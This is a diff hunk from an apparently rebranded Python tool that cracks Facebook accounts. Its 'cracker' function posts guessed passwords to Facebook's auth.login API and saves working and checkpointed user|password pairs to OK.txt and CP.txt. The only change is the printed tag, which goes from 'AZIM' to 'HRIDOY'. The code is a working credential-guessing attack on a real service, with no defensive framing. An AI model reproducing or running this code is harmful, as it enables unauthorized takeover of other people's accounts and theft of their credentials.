@@ -201,13 +201,13 @@ def cracker(user,pwx,tl):
 			xnxx = ses.post("https://b-api.facebook.com/method/auth.login", data=data, headers=head, allow_redirects=False).text
 			result = json.loads(xnxx)
 			if "session_key" in result:
-				print('\033[1;32m [AZIM-OK] '+user+'|'+pw+'\033[0;97m')
+				print('\033[1;32m [HRIDOY-OK] '+user+'|'+pw+'\033[0;97m')
 				open('OK.txt', 'a').write(user+'|'+pw+'\n')
 				oks.append(user)
 				break
 			elif "www.facebook.com" in result["error_msg"]:
 				print(result)
-				print('\033[1;31m [AZIM-CP] '+user+'|'+pw+'\033[0;97m')
+				print('\033[1;31m [HRIDOY-CP] '+user+'|'+pw+'\033[0;97m')
 				open('CP.txt', 'a').write(user+'|'+pw+'\n')
 				cps.append(user)
 				break
